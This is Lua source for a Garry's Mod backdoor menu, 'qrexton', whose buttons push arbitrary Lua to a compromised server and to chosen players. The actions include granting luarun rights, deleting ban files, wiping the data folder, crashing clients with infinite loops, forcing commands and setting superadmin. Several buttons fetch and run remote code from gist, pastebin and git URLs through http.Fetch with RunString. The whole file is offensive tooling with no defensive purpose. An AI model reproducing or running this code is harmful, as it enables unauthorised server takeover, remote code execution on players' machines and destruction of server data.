qrexton.AddButton( "Luarun access", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun") ]] )
end)

qrexton.AddButton( "Luarun code", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("LuaRun String", "String", "", function(text)
        qrexton.PostLua( [[ RunString( "]]..text..[[" ) ]] )
    end)
end)

qrexton.AddButton( "Launch everyone", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k, v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000, 5000), math.random(  1000, 5000), math.random(1000, 5000))) end ]] )
end)

qrexton.AddButton( "Lock all doors", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end ]] )
end)

qrexton.AddButton( "Rainbow physgun", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not physgun then hook.Add("Think", "rainbowphysgun", function() for k, ply in ipairs(player.GetAll()) do local col = HSVToColor(CurTime() % 6 * 60, 1, 1) ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255)) end end) physgun = true else hook.Remove("Think", "rainbowphysgun") physgun = false end ]] )
end)

qrexton.AddButton( "Rainbow hud", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not rainbowscreen then BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)") rainbowscreen = true else BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')") rainbowscreen = false end ]] )
end)

qrexton.AddButton( "Rainbow everything", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BroadcastLua([==[ if not timer.Exists("CP_Gaymod") then timer.Create("CP_Gaymod", 1, 0, function() local mats = Entity(0):GetMaterials() for k, v in pairs(mats) do local r, g, b = ColorRand().r - 50, ColorRand().g - 50, ColorRand().b - 50 Material(v):SetVector("$color", Vector(r, g, b)) end end) else timer.Remove("CP_Gaymod") end ]==]) ]] )
end)

qrexton.AddButton( "Remove bans", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end ]] )
end)

qrexton.AddButton( "Open url on players", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("URL On Players", "URL Link", "", function(str)
        qrexton.PostLua( [[ ply:SendLua([=[ h = vgui.Create("DHTML") h:SetSize(ScrW(), ScrH()) h:OpenURL(]]..str..[[) ]=]) ]] )
    end)
end)

qrexton.AddButton( "Unlock all doors", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end ]] )
end)

qrexton.AddButton( "Unban SteamID", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
        qrexton.PostLua( [[ ULib.unban("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Whitelist everything", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if FPP then for k, v in pairs(FPP.Blocked) do for r, g in pairs(v) do RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r) end end end ]] )
end)    

qrexton.AddButton( "Wipe data folder", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end ]] )
end)


// Targeting

local url__ = 'https://gist.githubusercontent.com/reystudio/95b52501eedc48f197cba13c198fa11a/raw/dbf93a2ad87ecbd0185f5632139d483f94d4ff1e/gistfile1.lua'

qrexton.AddButton("Control player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua([[ http.Fetch(']] .. url__ .. [[', RunString) ]])  --https://pastebin.com/raw/Fxp01tjw  https://pastebin.com/edit/TCJkUqq9 https://pastebin.com/raw/jRNcmTRt
    qrexchat("Press J to control player")

    hook.Add("Think", "ControllPlayerlol", function()
      local cache = input.IsButtonDown(KEY_J)

      if cache and FirstPressed then
        local skid=LocalPlayer():GetEyeTrace().Entity
        if not skid:IsPlayer() then return end
        
        net.Start("NachuiControll")
        net.WriteEntity(skid)

        net.SendToServer()
      end
      FirstPressed = not cache
    end)
end)


-----------------------------------

local shrekInitialized = false
local initTimer = nil
qrexton.AddButton('Shrekanization', SC2, function()
    surface.PlaySound("buttons/button18.wav")
    if (channel == "") then
        return
    end

    if initTimer then
        if !shrekInitialized and initTimer > CurTime() then
            qrexchat('Run Shrekanizator again in ' .. math.ceil(initTimer - CurTime()) .. ' seconds (clients download content)')
            return
        else
            shrekInitialized = true
        end
    else
        initTimer = CurTime() + 3
        qrexchat("Run Shrekanizator again in at least 3 seconds (clients download content)")
    end
    qrexton.PostLua([[
        local a = function(ent)
            shrekanization(ent, not shrekanization(ent))
        end
        if not shrekInitialized then
            http.Fetch('https://git.nahuy.life/rey/qrex-extensions/raw/branch/main/shrekanization.lua', RunString)
            shrekInitialized = true
        else
            if shrekanization then
                a(Player(]] .. selPly .. [[))
            end
        end]])
end)

-----------------------------------


--[=====[ 

qrexton.AddButton("teleportskid", SC2, function()
    surface.PlaySound("buttons/button18.wav")
Derma_StringRequest("teleportskid", "e.g m9k_barret_m82", "", function(str)

    qrexchat("Press T on a player")

    hook.Add("Think", "teleportskid", function()
      local cache = input.IsButtonDown(KEY_T)

      if cache and FirstPressed then
        local skid=LocalPlayer():GetEyeTrace().Entity
        if not skid:IsPlayer() then return end
        --below is line 727
       qrexton.PostLua([[ local selected = Player(]]..selPly..[[) local target = Player(]]..skid:UserID()..[[) selected:SetPos(target:GetPos()) selected:StripWeapons() [[ local weps = Player("]]..selPly..[[") weps:Give("]]..str..[[") ]] selected:SendLua('http.Fetch("https://pastebin.com/raw/QjgnweP5",RunString)') ]])
      end
      FirstPressed = not cache
    end)
end)

--]=====]

qrexton.AddButton( "Enable godmode", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):GodEnable() ]] )
end)

--qrexton.AddButton( "spectator mode", SC2, function()
 --qrexton.PlayerSpawn( selPly )
   --  qrexton.PostLua( [[ Player(]]..selPly..[[):() ]] )


  --  GAMEMODE:PlayerSpawnAsSpectator( selPly )




qrexton.AddButton( "Rapid fire", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ timer.Create("rf_]]..noobstr..[[", 0.01, 0, function() local p = Player("]]..selPly..[[") if p and IsValid(p) and p:Alive() then local w = p:GetActiveWeapon() if IsValid(w) then w:SetNextPrimaryFire(CurTime()) w:SetNextSecondaryFire(CurTime()) end end end) ]] )
end)


qrexton.AddButton( "Infinite ammo", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua([[timer.Create("ia_]]..noobstr..[[", 0.01, 0, function()
                local p = Player("]]..selPly..[[")
                if IsValid(p) && p:Alive() then
                local w = p:GetActiveWeapon()
                if IsValid(w) then
                w:SetClip1(w:GetMaxClip1())
                end end end)]])
end)

qrexton.AddButton( "Give weapons", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Give weapons", "e.g weapon_rpg", "", function(str)
        qrexton.PostLua( [[ local weps = Player("]]..selPly..[[") weps:Give("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Allahu ackbar", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local explo = ents.Create("env_explosion") local me = Player(]]..selPly..[[) explo:SetOwner(me) explo:SetPos(me:GetPos()) explo:SetKeyValue("iMagnitude", "250") explo:Spawn() explo:Activate() explo:Fire("Explode", "", 0) if me:Alive() then me:Kill() end ]] )
end)

qrexton.AddButton( "Enable godmode", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):GodEnable() ]] )
end)

qrexton.AddButton( "Disable godmode", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):GodDisable() ]] )
end)


qrexton.AddButton( "Ban player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!") ]] )
end)

local __url__ = 'https://gist.githubusercontent.com/reystudio/dcefce1582aa1a184b2e0a4fa4cc7be8/raw/629579cecbcef86ccf52580c550a63afbb1d1420/rage.lua'

qrexton.AddButton( "Co host Ragebot", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua([=[ http.Fetch("]] .. __url__ .. [[",RunString) ]=]) ]] )
end)

qrexton.AddButton( "Send Raw Lua", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua([=[ http.Fetch("https://pastebin.com/raw/B50m4sd2",RunString) ]=]) ]] )
end)

qrexton.AddButton( "Open url on player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("URL On Players", "URL Link", "", function(str)
        qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua([=[ h = vgui.Create("DHTML") h:SetSize(ScrW(), ScrH()) h:OpenURL(]]..str..[[) ]=]) ]] )
    end)
end)

--m9k_barret_m82

qrexton.AddButton( "Ban player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!") ]] )
end)


qrexton.AddButton( "Cleanup props", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):ConCommand("gmod_cleanup") ]] )
end)

qrexton.AddButton( "Crash player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua("while true do end") ]] )
end)

qrexton.AddButton( "Drop weapon", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):DropWeapon(Player(]] ..selPly.. [[):GetActiveWeapon()) ]] )
end)

qrexton.AddButton( "Force command", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Force Command", "e.g disconnect", "", function(str)
        qrexton.PostLua( [[ Player("]]..selPly..[["):ConCommand("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Force say", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Force Say", "e.g /ooc Hi", "", function(str)
        qrexton.PostLua( [[ Player(]]..selPly..[[):Say("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Force Retry", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Force Say", "e.g /ooc Hi", "", function(str)
        qrexton.PostLua( [[ Player("]]..selPly..[["):ConCommand("retry") ]] )
    end)
end)

qrexton.AddButton( "Noclip player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local me = Player("]]..selPly..[[") if me:GetMoveType() ~= MOVETYPE_NOCLIP then me:SetMoveType(MOVETYPE_NOCLIP) else me:SetMoveType(MOVETYPE_WALK) end ]] )
end)

qrexton.AddButton( "Set usergroup", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set UserGroup", "e.g superadmin", "", function(str)
        qrexton.PostLua( [[ Player(]]..selPly..[[):SetUserGroup("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Noclip player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local me = Player("]]..selPly..[[") if me:GetMoveType() ~= MOVETYPE_NOCLIP then me:SetMoveType(MOVETYPE_NOCLIP) else me:SetMoveType(MOVETYPE_WALK) end ]] )
end)

qrexton.AddButton( "Speed hack", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local me = Player(]]..selPly..[[) if not me.Sanic then me:SetRunSpeed(1200) me:SetWalkSpeed(800) me.Sanic = true else me:SetRunSpeed(240) me:SetWalkSpeed(160) me.Sanic = false end ]] )
end)


qrexton.AddButton( "Set money", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set money", "+ = give / - = remove", "", function(str)
        qrexton.PostLua( [[ local ree = Player("]]..selPly..[[") ree:addMoney("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Give ammo", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local ply = nil % s for i = 1, 100 do ply:GiveAmmo(10000, i, false) end ]] )
end)

qrexton.AddButton( "M9K nuke", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local nuke = ents.Create("m9k_davy_crockett_explo") local me = Player("]]..selPly..[[") nuke:SetPos(me:GetPos()) nuke:SetOwner(me) nuke.Owner = me nuke:Spawn() nuke:Activate() ]] )
end)

qrexton.AddButton( "Remove user", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SetUserGroup("user")) ]] )
end)

qrexton.AddButton( "Kick Player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):Kick("[CAC] Truth Engineering") ]] )
end)

qrex:Hide()

local toggle = false

hook.Add("Think", "keyToggle", function()
    if input.IsKeyDown(openKey) and not toggle then
        toggle = true
        qrex:SetVisible(not qrex:IsVisible())
        gui.EnableScreenClicker(qrex:IsVisible())
    elseif not input.IsKeyDown(openKey) then
        toggle = false
    end
end)